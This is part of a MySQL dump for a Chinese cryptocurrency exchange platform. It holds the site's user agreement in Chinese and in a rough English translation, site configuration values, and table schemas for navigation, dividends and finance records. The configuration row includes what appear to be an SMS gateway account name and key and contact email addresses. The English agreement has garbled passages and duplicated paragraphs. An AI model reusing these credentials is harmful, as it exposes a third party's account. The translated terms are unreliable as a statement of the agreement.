①用户注册国际数字资产交易平台账户时，向国际数字资产交易平台提供的个人信息。 <br />\r\n  ②用户在使用国际数字资产交易平台服务、参加网站活动或访问网站网页时，国际数字资产交易平台自动接收并记录的用户浏览器端或手机客户端数据， 包括但不限于IP地址、网站中的资料及用户要求取用的网页记录。 <br />\r\n  ③国际数字资产交易平台从商业伙伴处合法获取的用户个人信息。 <br />\r\n  ④其它国际数字资产交易平台通过合法途径获取的用户个人信息。 <br />\r\n2、国际数字资产交易平台承诺：非经法定原因或用户事先许可，不会向任何第三方透露用户的密码、姓名、 手机号码等非公开信息。 <br />\r\n3、在下述法定情况下，用户的个人信息将会被部分或全部披露： <br />\r\n  ①经用户同意向用户本人或其他第三方披露。 <br />\r\n  ②根据法律、法规等相关规定，或行政机构要求，向行政、司法机构或其他法律规定的第三方披露。 <br />\r\n  ③其它国际数字资产交易平台根据法律、法规等相关规定进行的披露。 <br />\r\n<br />\r\n<br />\r\n用户权利<br />\r\n1、用户的用户名、密码和安全性： <br />\r\n  ①用户有权选择是否成为国际数字资产交易平台用户，用户选择成为国际数字资产交易平台注册用户时，可自行输入手机号为帐号。 用户名和帐号使用应遵守相关法律法规并符合网络道德。用户名和帐号中不能含有任何侮辱、威胁、淫秽、 谩骂等侵害他人合法权益的文字。 <br />\r\n ②用户一旦注册成功，成为国际数字资产交易平台的用户，将得到用户名和密码， 并对以此组用户名和密码登入系统后所发生的所有活动和事件负责，自行承担一切使用该用户名的言语、 行为等而直接或者间接导致的法律责任。 <br />\r\n ③用户有义务妥善保管交易平台账号、用户名和密码，用户将对用户名和密码安全负全部责任。 因用户原因导致用户名或密码泄露而造成的任何法律后果由用户本人负责，由于用户自身原因泄露这些信息导致的财产损失， 本站不负相关责任。由于本站是交易网站，登录密码、提现密码、交易密码等不得使用相同密码，否则会有安全隐患， 相关责任由用户自身承担。 <br />\r\n④用户密码遗失的，可以通过绑定的手机号码重置密码。用户若发现任何非法使用用户名或存在其他安全漏洞的情况， 应立即告知国际数字资产交易平台运营平台。 <br />\r\n⑤国际数字资产交易平台不会向任何用户索取密码，不会让用户往任何非本站交易中心里提供的帐户打款， 请大家不要相信任何非国际数字资产交易平台提供的打折、优惠等诈骗信息，往非国际数字资产交易平台提供的账户、 地址里打款或币造成的损失本站不负责任。 <br />\r\n2、用户有权根据网站相关规定，在发布信息等贡献后，取得国际数字资产交易平台给予的奖励。 <br />\r\n3、用户有权修改其个人账户中各项可修改信息，自行录入介绍性文字，自行决定是否提供非必填项的内容。4、用户有权参加国际数字资产交易平台组织提供的各项线上、线下活动。 <br />\r\n5、用户有权根据国际数字资产交易平台网站规定，享受国际数字资产交易平台提供的其它各类服务。 <br />\r\n<br />\r\n用户义务<br />\r\n1、不得利用本站危害国家安全、泄露国家秘密，不得侵犯国家社会集体的和公民的合法权益，不得利用本站制作、 复制和传播下列信息： <br />\r\n①煽动抗拒、破坏宪法和法律、行政法规实施的。 <br />\r\n②煽动颠覆国家政权，推翻社会主义制度的。 <br />\r\n③煽动分裂国家、破坏国家统一的。 <br />\r\n④煽动民族仇恨、民族歧视，破坏民族团结的。 <br />\r\n⑤捏造或者歪曲事实，散布谣言，扰乱社会秩序的。 <br />\r\n⑥宣扬封建迷信、淫秽、色情、赌博、暴力、凶杀、恐怖、教唆犯罪的。 <br />\r\n⑦公然侮辱他人或者捏造事实诽谤他人的，或者进行其他恶意攻击的。 <br />\r\n⑧损害国家机关信誉的。 <br />\r\n⑨其他违反宪法和法律行政法规的。 <br />\r\n⑩进行商业广告行为的。 <br />\r\n2、用户不得通过任何手段恶意注册国际数字资产交易平台网站帐号，包括但不限于以牟利、炒作、套现、 获奖等为目的多个账号注册。用户亦不得盗用其他用户帐号,或者利用国际数字资产交易平台以及交易平台漏洞刷取。 如用户违反上述规定，则国际数字资产交易平台有权直接采取一切必要的措施，包括但不限于删除用户发布的内容、 取消用户在网站获得的虚拟财富，暂停或查封用户帐号，取消因违规所获利益，乃至通过诉讼形式追究用户法律责任等。 <br />\r\n3、禁止用户将国际数字资产交易平台以任何形式作为从事各种非法活动的场所、平台或媒介。 未经国际数字资产交易平台运营平台的授权或许可，用户不得借用本站的名义从事任何商业活动， 也不得以任何形式将国际数字资产交易平台作为从事商业活动的场所、平台或媒介。如用户违反上述规定， 则国际数字资产交易平台运营平台有权直接采取一切必要的措施，包括但不限于删除用户发布的内容、取消用户在网站获得的虚拟财富， 暂停或查封用户帐号，取消因违规所获利益，乃至通过诉讼形式追究用户法律责任等。 <br />\r\n4、用户在国际数字资产交易平台以各种形式发布的一切信息，均应符合国家法律法规等相关规定及网站相关规定， 符合社会公序良俗，并不侵犯任何第三方主体的合法权益，否则用户自行承担因此产生的一切法律后果， 且国际数字资产交易平台因此受到的损失，有权向用户追偿。 <br />\r\n5、按照国际数字资产交易平台的要求准确提供并及时更新您正确、最新及完整的身份信息及相关资料。 若国际数字资产交易平台有合理理由怀疑您提供的身份信息即相关资料错误、不实、过失或不完整的， 国际数字资产交易平台有权要求您补充相关资料来证明您身份的真实性。若您不能及时配合提供， 国际数字资产交易平台有权暂停或终止向您提供服务。国际数字资产交易平台对此不承担任何责任， 您将承担因此产生的任何直接或间接支出。 <br />\r\n6、用户应当有独立的风险承担能力，以及具备相应的民事行为能力，注册实名认证用户应为中国大陆地区公民， 年龄限制在16周岁~70周岁。 <br />\r\n<br />\r\n拒绝担保与免责<br />\r\n1、国际数字资产交易平台作为“网络服务提供者”的第三方平台，不担保网站平台上的信息及服务能充分满足用户的需求。 对于用户在接受国际数字资产交易平台的服务过程中可能遇到的错误、侮辱、诽谤、不作为、淫秽、色情或亵渎事件， 国际数字资产交易平台不承担法律责任。 <br />\r\n2、基于互联网的特殊性，国际数字资产交易平台也不担保服务不会受中断，对服务的及时性、安全性都不作担保， 不承担非因国际数字资产交易平台导致的责任。国际数字资产交易平台力图使用户能对本网站进行安全访问和使用， 但国际数字资产交易平台不声明也不保证本网站或其服务器是不含病毒或其它潜在有害因素的。 因此用户应使用业界公认的软件查杀任何自国际数字资产交易平台下载文件中的病毒。 <br />\r\n3、国际数字资产交易平台不对用户所发布信息的保存、修改、删除或储存失败负责。 对网站上的非因国际数字资产交易平台故意所导致的排字错误、疏忽等不承担责任。国际数字资产交易平台有权但无义务， 改善或更正本网站任何部分之疏漏、错误。 <br />\r\n4、除非国际数字资产交易平台以书面形式明确约定，国际数字资产交易平台对于用户以任何方式（包括但不限于包含、经由、连接或下载 ）从本网站所获得的任何内容信息，包括但不限于广告等，不保证其准确性、完整性、可靠性； 对于用户因本网站上的内容信息而购买、获取的任何产品、服务、信息或资料，国际数字资产交易平台不承担责任。 用户自行承担使用本网站信息内容所导致的风险。 <br />\r\n5、国际数字资产交易平台内所有用户所发表的用户评论，仅代表用户个人观点， 并不表示本网站赞同其观点或证实其描述，本网站不承担用户评论引发的任何法律责任。 <br />\r\n6、国际数字资产交易平台有权删除国际数字资产交易平台内各类不符合法律或协议规定的信息，而保留不通知用户的权利。 <br />\r\n7、所有发给用户的通告，国际数字资产交易平台都将通过正式的页面公告、站内信、电子邮件、客服电话、 手机短信或常规的信件送达。任何非经国际数字资产交易平台正规渠道获得的中奖、优惠等活动或信息， 国际数字资产交易平台不承担法律责任。 <br />\r\n<br />\r\n适用法律和裁判地点<br />\r\n1、因用户使用国际数字资产交易平台而引起或与之相关的一切争议、权利主张或其它事项， 均受中华人民共和国法律的管辖。 <br />\r\n2、用户和国际数字资产交易平台发生争议的，应首先本着诚信原则通过协商加以解决。 如果协商不成，则应向国际数字资产交易平台所在地人民法院提起诉讼。 <br />\r\n<br />\r\n可分性<br />\r\n如果本协议的任何条款被视为不合法、无效或因任何原因而无法执行，则此等规定应视为可分割， 不影响任何其它条款的法律效力。 <br />\r\n<br />\r\n冲突选择<br />\r\n本协议是国际数字资产交易平台与用户注册成为国际数字资产交易平台用户，使用国际数字资产交易平台服务之间的重要法律文件， 国际数字资产交易平台或者用户的任何其他书面或者口头意思表示与本协议不一致的，均应当以本协议为准。 <br />\r\n                                                                                   国际数字资产交易平台<br />\r\n                                                                                    2016年1月1日<br />\r\n<br />\r\n</span><span style=\"color:#337FE5;\"></span></span> \r\n		</div>\r\n</span><span style=\"color:#337FE5;\"></span></span> \r\n	</div>\r\n	<div style=\"text-align:left;\">\r\n		<span style=\"color:#337FE5;\"></span> \r\n	</div>\r\n</div>\r\n<p>\r\n	<span style=\"font-size:10px;color:#E56600;\"></span> \r\n</p>', '<p align=\"left\" style=\"text-align:left;\">\r\n	<b>Service Terms<br />\r\n<br />\r\nOwnership and operation of the services International Digital Asset Trading Platform provided by this platform are the property of all. World Bull Terms of Service (hereinafter referred to as the \'Terms\') is regulated by the relevant rights and obligations of the service user and the World Bull International Digital Asset Trading Platform being made. Users by accessing and / or using the Site is accept and agree to all the terms and conditions of this Agreement. International Digital Asset Trading Platform as this platform (www.International Digital Asset Trading Platform.com) operators under this agreement provide services for users. Unwilling to accept the terms of this Agreement shall not access or use this site.<br />\r\nWorld Bull reserves the right to revise the terms of this agreement, once published the revised agreement that is effective to replace the original agreement. Users can check the latest agreement at any time.<br />\r\nFirst, the terms of service <br />\r\n1. World Bull use their own system, through the Internet and other means to provide digital asset trading services for users. <br />\r\n2. The user must prepare their own equipment and bear the following expenses as follows: (1) Internet access devices, including, but not limited to computers or other Internet terminals, modems, and other access devices; (2) Internet access costs, including, but not limited to Internet access fees, Internet equipment rental, and phone traffic fees. <br />\r\n3. Registration information provided by the user, the user agrees: (1) providing a legitimate, true, accurate and detailed personal information; (2) are subject to change, update user information. If the registration information provided by the user is not illegal, untrue, inaccurate, not exhaustive, the user must therefore assume the corresponding responsibility and the consequences arising, and reserves the right to terminate the right to use than user network services network than the right.<br />\r\nSecond, service delivery, modification and termination <br />\r\n1. The user accepts World Bull various services, agreed to accept all kinds of information and services of the platform. User hereby authorize the platform can send business information to its e-mail, phone, mailing address, etc. Users have the right to choose not to accept all kinds of information and services offered on this platform, and enter the relevant page of the platform change. <br />\r\n2. World Bull reserves the right to modify or discontinue the service without notice user\'s rights. International Digital Asset Trading Platform entitled to exercise the right to modify or discontinue service, without the user or any third party not directly related. <br />\r\n3. The user modification of this agreement have objections, or dissatisfied with the service International Digital Asset Trading Platform, can exercise the following rights:<br />\r\n   - Stop using Word Bull network services;<br />\r\n   - inform the World Bull stop its services through customer service. After the service, the rights of users of network services International Digital Asset Trading Platform terminated immediately. In this case, the platform has no obligation to send any pending or completed information services to users or any third parties not directly related.<br />\r\nThree, confidential user information <br />\r\n1. International Digital Asset Trading Platform user information in this Agreement, the term refers to compliance with laws, rules and regulations, and in accordance with the following range of information :<br />\r\n   - When the user registration application for World Bull World Bull or a member of the personal information provided to this platform;<br />\r\n   - When users use International Digital Asset Trading Platform services, to participate in the site activity or visit the Web site pages, the platform automatically receives and records the user\'s browser or mobile phone client end end data, including but not limited to, IP addresses, websites Cookie information and user requirements in access to web logs;<br />\r\n   - The user\'s personal information from business partners International Digital Asset Trading Platform legally acquired;<br />\r\n   - Other International Digital Asset Trading Platform personal information through legitimate channels acquired.<br />\r\n2, World Bull promise : <br />\r\nthrough legal reasons or user prior authorization, International Digital Asset Trading Platform not disclose non-public information about a user\'s password, name, phone number and so on to any third party. <br />\r\n3, in the following legal case, the user\'s personal information will be partially or fully disclosed :<br />\r\n   - Consent of the user himself or disclosed to third parties other users;<br />\r\n   - According to relevant laws, regulations, or administrative agency request, disclose to third parties the executive, judicial or other legal provisions;<br />\r\n   - Other International Digital Asset Trading Platform be disclosed in accordance with the relevant laws and regulations.<br />\r\nFourth, the user right <br />\r\n1. The user name, password and security<br />\r\n   - The user has the right to choose whether to become International Digital Asset Trading Platform member, if the user chooses to become a registered user of this platform, e-mail address shall be used as the name of the platform members. E-mail address used should comply with the relevant laws and regulations and in line with the network ethics.<br />\r\n   - Once users register successfully and become International Digital Asset Trading Platform member, will be the user\'s mailbox (user name) and password, and this group of users mailbox (user name) and password for all the activities and events that occur after the login to the system responsible for their own bear all use the E-mail (user name) of speech, behavior, etc., directly or indirectly lead to legal liability.<br />\r\n   - Safekeeping under an obligation International Digital Asset Trading Platform account, e-mail (user name) and password, SMS verification code, users will be E-mail (username) and password bear full responsibility. Any legal consequences due to user causes E-mail (username) or passwords leak caused by the user himself is responsible for their own reasons because the user information leak caused damage to property, the site assumes liability. Since the site was trading website, the login password, cash password, transaction password, etc. can not use the same password, or there will be a security risk, related responsibilities borne by the users themselves.<br />\r\n   - The user password is lost, you can send e-mail messages by registering to mail@International Digital Asset Trading Platform.com or contact customer service. If users find any illegal use of electronic mail (user name) or the existence of other security vulnerabilities should be immediately informed of the internet.<br />\r\n   - International Digital Asset Trading Platform not obtainable from any user passwords, user accounts will not let go of any non-trading center site provides digital asset recharge addresses play money, please do not believe that any International Digital Asset Trading Platform discounts, promotions and other fraudulent information, if the transaction is International Digital Asset Trading Platform account platform, address in play money or currency losses this platform irresponsible.<br />\r\n   - International Digital Asset Trading Platform not obtainable from any user passwords, user accounts will not let go of any non-trading center site provides digital asset recharge addresses play money, please do not believe that any International Digital Asset Trading Platform discounts, promotions and other fraudulent information, if the transaction is International Digital Asset Trading Platform account platform, address in play money or currency losses this platform irresponsible.<br />\r\n2. The user is entitled in accordance with the relevant provisions of the site, after the release of information, the contribution made International Digital Asset Trading Platform a reward; <br />\r\n3. The user has the right to modify their personal accounts can modify the information to decide whether to provide non-required content; <br />\r\n4. The user is entitled in accordance with the relevant provisions of the site, get International Digital Asset Trading Platform give rewards (such as physical rewards or loyalty points); <br />\r\n5. The user has the right to participate in the online International Digital Asset Trading Platform organizations, offline activities; <br />\r\n6. The user is entitled in accordance with the provisions of International Digital Asset Trading Platform website, enjoy other types of services. The platform provides.<br />\r\nFifth, the user obligations <br />\r\n1. Can not use this platform to endanger national security, leaking state secrets, shall not infringe upon the legitimate rights and interests of national social collective and citizens may not use this site production, reproduction and dissemination of the<br />\r\n   following information:<br />\r\n     - Once users register successfully and become International Digital Asset Trading Platform member, will be the user\'s mailbox (user name) and password, and this group of users mailbox (user name) and password for all the activities and events that occur after the login to the system responsible for their own bear all use the E-mail (user name) of speech, behavior, etc., directly or indirectly lead to legal liability.<br />\r\n   - regulations to implement;<br />\r\n     - Incitement to subvert state power and overthrow the socialist system;<br />\r\n     - Incitement to split the country and undermine national unity;<br />\r\n     - Incitement to ethnic hatred, ethnic discrimination, undermining national unity;<br />\r\n     - Fabrication or distortion of facts, spread rumors, disturbs social order;<br />\r\n     - Promoting feudal superstitions, obscenity, pornography, gambling, violence, murder, terrorism, aiding and abetting a crime;<br />\r\n     - Affront others or fabricating facts to slander others, or other malicious attacks;<br />\r\n     - Damage to reputation of state organs;<br />\r\n     - Violation of the Constitution and other laws and administrative regulations;<br />\r\n     - Commercial advertising behavior.<br />\r\n2. The user can not by any means a malicious Web site registered International Digital Asset Trading Platform account, including but not limited to, profit, hype, cash, winning multiple accounts for the purpose of registration. Users also should not be misappropriated other user accounts. <br />\r\nIf the user in violation of these provisions, the International Digital Asset Trading Platform right to take all necessary measures to direct, including, but not limited to, delete users to publish content, cancel the user in website ratings, honor and virtual wealth, suspended or closed down user accounts, canceled due to irregularities the benefits obtained, and even prosecuted user through litigation and other forms of legal liability. <br />\r\n3. Prohibits any form of user International Digital Asset Trading Platform as engaged in various illegal activities, sites, platforms or media. International Digital Asset Trading Platform without authorization or license, the user can not borrow the name of the platform to engage in any commercial activity, nor any form will International Digital Asset Trading Platform as engaged in commercial activities places, platforms or media. <br />\r\nIf the user in violation of these provisions, the International Digital Asset Trading Platform right to take all necessary measures to direct, including, but not limited to, delete users to publish content, cancel the user in website ratings, honor and virtual wealth, suspended or closed down user accounts, canceled due to irregularities the benefits obtained, and even prosecuted user through litigation and other forms of legal liability. <br />\r\n4, all the information of the user in Word Bull issued in various forms, shall comply with the relevant regulations and site-related regulations and laws, in line with the social public order and morals and does not infringe on the legal rights of any third party body, otherwise the user to bear thus creating all the legal consequences, and therefore subject to more than the right to net loss, the user has the right to recover. <br />\r\n5. Users may not fictitious facts, etc. malicious slander International Digital Asset Trading Platform goodwill.<br />\r\nSix, refused to guarantee and Disclaimer <br />\r\n1. International Digital Asset Trading Platform as a \"network service provider\" of third-party platform, do not guarantee the website information and services on the platform to fully meet the needs of users. For user error in accepting this platform service process may encounter, insult, slander, omission, obscene, pornographic or profane events, this platform is not liable. <br />\r\n2. Based on the special nature of the Internet, International Digital Asset Trading Platform nor the security services will not be interrupted, the timeliness of service, security is not guaranteed, does not assume responsibility caused by reason of the platform. <br />\r\nThe platform allows users to secure access to this website and use, but this platform does not represent nor warrant that the website or servers are free of viruses or other potentially harmful factors; therefore users should use industry-recognized software killing than any since right network to download the file for viruses. <br />\r\n3. International Digital Asset Trading Platform not release the user to save the information, modify, delete or save responsible for the failure. For typographical errors on the site due to the non-right network than deliberately caused, we are not liable for negligence. World Bull has the right but not the obligation, to improve or correct omissions in any portion of this site error. <br />\r\n4. International Digital Asset Trading Platform unless expressly agreed in writing, the platform for the user in any way (including but not limited to contain, via connection or download) any content information obtained from this website, including, but not limited to advertising, does not guarantee its accuracy, completeness, reliability; for the user because the content information on this site and purchase, acquire any products, services, information, or data, this platform is not liable. Users bear the risk of using the information content of the website caused. <br />\r\n5. All users in the network International Digital Asset Trading Platform published user comments on behalf of only the user\'s personal point of view, does not mean that this site agree with their views or confirm the description, this site does not assume any liability caused by user reviews. <br />\r\n6. International Digital Asset Trading Platform the right to delete this platform within the network of various types of information does not comply with the law or agreement, and without notifying the user rights reserved. <br />\r\n7. All notices sent to the user, this platform will page through formal announcement, the station letter, e-mail, customer service phone, SMS or regular mail delivery. Any non-regular pipeline through this platform to get the win, promotions and other activities, or information, this platform is not liable. <br />\r\n8. International Digital Asset Trading Platform right to adjust according to market conditions recharge, cash, trade and other fee rates, the right to decide to terminate free promotion period.<br />\r\nSeven, the applicable law and the referee Location <br />\r\n1. Because users use Word Bull website all disputes arising out of or, claims or other matters, are subject to the jurisdiction of the People\'s Republic of China associated with the law. <br />\r\n2. Users and International Digital Asset Trading Platform dispute should first be resolved through good faith negotiation. If the negotiation fails, it should sue the local people\'s court of the platform.<br />\r\nEight, Severability <br />\r\nIf any provision of this Agreement shall be deemed unlawful, void or for any reason unenforceable, then such provision shall be deemed severable and not affect the legal validity of any other provision.<br />\r\nNine, conflict select <br />\r\nThis Agreement is International Digital Asset Trading Platform user to register as a user of the platform, use this platform an important legal document between services, and any other written or oral means or the user of this platform represents inconsistent with this Agreement, this Agreement shall prevail.<br />\r\n <br />\r\n<br />\r\n</b> \r\n</p>\r\n<p>\r\n	<span></span> \r\n</p>', 'ppc_usd', 'ppc', 'cny', '不投入超过风险承受能力的资金，不投资不了解的数字资产，不听信任何推荐买币投资的宣传，坚决抵制传销、电信诈骗和洗钱套汇等违法行为。', '1', 'http://utf8.sms.webchinese.cn', 'qiao123456', '176a702185a7a541de09', '', 'http://weibo.com/', '', '3020831894', '', 'li83839140', '56f98e6d70135.jpg', '83839140@qq.com', '83839140@qq.com', '56f98e6d7245d.jpg', '中国银行|动说科技|0000 0000 0000 0000', '2', '2', '2', '2', '&lt;span&gt;&lt;span&gt;会员您好,务必正确填写好自己的真实姓名和真实身份证号码.&lt;/span&gt;&lt;/span&gt;', '&lt;span&gt;会员您好,务必用自己的手机号码进行手机认证,认证以后可以用来接收验证码.&lt;/span&gt;', '&lt;span&gt;会员您好,务必正确填写支付宝 &amp;nbsp;真实姓名（与实名认证姓名相同）和支付宝账号,后期提现唯一依据.&lt;/span&gt;', '&lt;span&gt;会员您好,&lt;/span&gt;&lt;span&gt;&lt;span&gt;务必正确填写银行卡信息 提现唯一依据.&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;', '&lt;span&gt;自己以往操作和登录及登录地点的相关记录.&lt;/span&gt;', '&lt;span&gt;会员您好,修改登录密码以后请不要忘记.若不记得旧登录密码,请点击--&lt;/span&gt;&lt;span style=&quot;color:#EE33EE;&quot;&gt;忘记密码&lt;/span&gt;', '&lt;span&gt;会员您好,修改交易密码以后请不要忘记.若不记得旧交易密码,请点击--&lt;/span&gt;&lt;span style=&quot;color:#EE33EE;&quot;&gt;忘记密码&lt;/span&gt;', '0.001', '50000', '1', 'cny', '0.1', '1', '10000000', '10', '&lt;span&gt;&lt;span&gt;你委托买入或者卖出成功交易后的记录.&lt;/span&gt;&lt;/span&gt;', '5', '24', '1', '100000', '100', '100000', '100', '理财首页', '理财记录', '理财类型', '1', '5', '3', '2', '探索未来财富世界', ' Exploring the future wealth world', '&lt;span&gt;&lt;span&gt;查看自己推广的好友,请点击&lt;/span&gt;&lt;span style=&quot;color:#EE33EE;&quot;&gt;“+”&lt;/span&gt;&lt;span&gt;,同时正确引导好友实名认证以及买卖,赚取推广收益和交易手续费.&lt;/span&gt;&lt;/span&gt;', '系统可靠', '银行级用户数据加密、动态身份验证多级风险识别控制，保障交易安全', '系统可靠', '账户多层加密，分布式服务器离线存储，即时隔离备份数据，确保安全', '快捷方便', '充值即时、提现迅速，每秒万单的高性能交易引擎，保证一切快捷方便', '服务专业', '热忱的客服工作人员和24小时的技术团队随时为您的账户安全保驾护航', '&lt;p&gt;\r\n	&lt;a href=&quot;/Article/index/type/aboutus.html&quot; target=&quot;_blank&quot;&gt;/Article/index/type/aboutus.html&lt;/a&gt;\r\n&lt;/p&gt;\r\n&lt;p&gt;\r\n	&lt;br /&gt;\r\n&lt;/p&gt;\r\n&lt;p&gt;\r\n	&amp;lt;a href=&quot;&lt;a href=&quot;/Article/index/type/aboutus.html&quot; target=&quot;_blank&quot;&gt;/Article/index/type/aboutus.html&lt;/a&gt;&quot;&amp;gt;关于我们&amp;lt;/a&amp;gt;\r\n&lt;/p&gt;\r\n|&lt;br /&gt;\r\n&amp;lt;a href=&quot;/Article/index/type/aboutus.html&quot;&amp;gt;联系我们&amp;lt;/a&amp;gt;&lt;br /&gt;\r\n|&lt;br /&gt;\r\n&amp;lt;a href=&quot;/Article/index/type/aboutus.html&quot;&amp;gt;资质证明&amp;lt;/a&amp;gt;&lt;br /&gt;\r\n|&lt;br /&gt;\r\n&amp;lt;a href=&quot;/Article/index/type/aboutus.html&quot;&amp;gt;用户协议&amp;lt;/a&amp;gt;&lt;br /&gt;\r\n|&lt;br /&gt;\r\n&amp;lt;a href=&quot;/Article/index/type/aboutus.html&quot;&amp;gt;法律声明&amp;lt;/a&amp;gt;&lt;br /&gt;\r\n&amp;lt;p style=&quot;margin-top: 5px;text-align: center;&quot;&amp;gt;&lt;br /&gt;\r\nCopyright &amp;copy; 2016&lt;br /&gt;\r\n&amp;lt;a href=&quot;/&quot;&amp;gt;{$C[\'web_name\']}交易平台 &amp;lt;/a&amp;gt;&lt;br /&gt;\r\nAll Rights Reserved.&lt;br /&gt;\r\n&amp;lt;a href=&quot;http://www.miibeian.gov.cn/&quot;&amp;gt;{$C[\'web_icp\']}&amp;lt;/a&amp;gt;{$C[\'web_cnzz\']|htmlspecialchars_decode}&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;lt;/p&amp;gt;&lt;br /&gt;\r\n&amp;lt;p class=&quot;clear1&quot; id=&quot;ut646&quot; style=&quot;margin-top: 10px;text-align: center;&quot;&amp;gt;&lt;br /&gt;\r\n&amp;lt;a href=&quot;http://webscan.360.cn/index/checkwebsite/url/www.movesay.com&quot; target=&quot;_blank&quot;&amp;gt;&amp;lt;img border=&quot;0&quot; width=&quot;83&quot; height=&quot;31&quot; src=&quot;http://img.webscan.360.cn/status/pai/hash/a272bae5f02b1df25be2c1d9d0b251f7&quot;/&amp;gt;&amp;lt;/a&amp;gt;&lt;br /&gt;\r\n&amp;lt;a href=&quot;http://www.szfw.org/&quot; target=&quot;_blank&quot; id=&quot;ut118&quot; class=&quot;margin10&quot;&amp;gt;&lt;br /&gt;\r\n&amp;lt;img src=&quot;__UPLOAD__/footer/footer_2.png&quot;&amp;gt;&lt;br /&gt;\r\n&amp;lt;/a&amp;gt;&lt;br /&gt;\r\n&amp;lt;a href=&quot;http://www.miibeian.gov.cn/&quot; target=&quot;_blank&quot; id=&quot;ut119&quot; class=&quot;margin10&quot;&amp;gt;&lt;br /&gt;\r\n&amp;lt;img src=&quot;__UPLOAD__/footer/footer_3.png&quot;&amp;gt;&lt;br /&gt;\r\n&amp;lt;/a&amp;gt;&lt;br /&gt;\r\n&amp;lt;a href=&quot;http://www.cyberpolice.cn/&quot; target=&quot;_blank&quot; id=&quot;ut120&quot; class=&quot;margin10&quot;&amp;gt;&lt;br /&gt;\r\n&amp;lt;img src=&quot;__UPLOAD__/footer/footer_4.png&quot;&amp;gt;&lt;br /&gt;\r\n&amp;lt;/a&amp;gt;&lt;br /&gt;\r\n&amp;lt;/p&amp;gt;&lt;br /&gt;', '', '', '', '', '', '', '1467383018', '1', '', '/Upload/shop/57fb634517d1a.png', '1', 'd', '1', '0');

-- ----------------------------
-- Table structure for `movesay_daohang`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_daohang`;
CREATE TABLE `movesay_daohang` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '自增id',
  `name` varchar(255) NOT NULL COMMENT '名称',
  `title` varchar(255) NOT NULL COMMENT '名称',
  `url` varchar(255) NOT NULL COMMENT 'url',
  `sort` int(11) unsigned NOT NULL COMMENT '排序',
  `addtime` int(11) unsigned NOT NULL COMMENT '添加时间',
  `endtime` int(11) unsigned NOT NULL COMMENT '编辑时间',
  `status` tinyint(4) NOT NULL COMMENT '状态',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=8 DEFAULT CHARSET=gbk ROW_FORMAT=DYNAMIC;

-- ----------------------------
-- Records of movesay_daohang
-- ----------------------------
INSERT INTO `movesay_daohang` VALUES ('1', 'finance', '财务中心', 'Finance/index', '1', '0', '0', '1');
INSERT INTO `movesay_daohang` VALUES ('2', 'user', '安全中心', 'User/index', '2', '0', '0', '1');
INSERT INTO `movesay_daohang` VALUES ('3', 'game', '应用中心', 'Game/index', '3', '0', '0', '1');
INSERT INTO `movesay_daohang` VALUES ('4', 'article', '帮助中心', 'Article/index', '4', '0', '0', '1');
INSERT INTO `movesay_daohang` VALUES ('6', 'shop', '云购商城', 'Shop/index', '3', '0', '0', '0');

-- ----------------------------
-- Table structure for `movesay_fenhong`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_fenhong`;
CREATE TABLE `movesay_fenhong` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `coinname` varchar(50) NOT NULL,
  `coinjian` varchar(50) NOT NULL,
  `num` decimal(20,8) unsigned NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of movesay_fenhong
-- ----------------------------

-- ----------------------------
-- Table structure for `movesay_fenhong_log`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_fenhong_log`;
CREATE TABLE `movesay_fenhong_log` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `coinname` varchar(50) NOT NULL,
  `coinjian` varchar(50) NOT NULL,
  `fenzong` varchar(50) NOT NULL,
  `fenchi` varchar(50) NOT NULL,
  `price` decimal(20,8) unsigned NOT NULL,
  `num` decimal(20,8) unsigned NOT NULL,
  `mum` decimal(20,8) unsigned NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL,
  `userid` int(11) unsigned NOT NULL COMMENT '用户id',
  PRIMARY KEY (`id`),
  KEY `name` (`name`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of movesay_fenhong_log
-- ----------------------------

-- ----------------------------
-- Table structure for `movesay_finance`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_finance`;
CREATE TABLE `movesay_finance` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '自增id',
  `userid` int(11) unsigned NOT NULL COMMENT '用户id',
  `coinname` varchar(50) NOT NULL COMMENT '币种',
  `num_a` decimal(20,8) unsigned NOT NULL COMMENT '之前正常',
  `num_b` decimal(20,8) unsigned NOT NULL COMMENT '之前冻结',
  `num` decimal(20,8) unsigned NOT NULL COMMENT '之前总计',
  `fee` decimal(20,8) unsigned NOT NULL COMMENT '操作数量',
  `type` varchar(50) NOT NULL COMMENT '操作类型',
  `name` varchar(50) NOT NULL COMMENT '操作名称',
  `nameid` int(11) NOT NULL COMMENT '操作详细',
  `remark` varchar(50) NOT NULL COMMENT '操作备注',
  `mum_a` decimal(20,8) unsigned NOT NULL COMMENT '剩余正常',
  `mum_b` decimal(20,8) unsigned NOT NULL COMMENT '剩余冻结',
  `mum` decimal(20,8) unsigned NOT NULL COMMENT '剩余总计',
  `move` varchar(50) NOT NULL COMMENT '附加',
  `addtime` int(11) unsigned NOT NULL COMMENT '添加时间',
  `status` tinyint(4) unsigned NOT NULL COMMENT '状态',
  PRIMARY KEY (`id`),
  KEY `userid` (`userid`),
  KEY `coinname` (`coinname`),
  KEY `status` (`status`)
) ENGINE=MyISAM AUTO_INCREMENT=971286 DEFAULT CHARSET=utf8 COMMENT='财务记录表';

-- ----------------------------
-- Records of movesay_finance
-- ----------------------------

-- ----------------------------
-- Table structure for `movesay_footer`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_footer`;
CREATE TABLE `movesay_footer` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
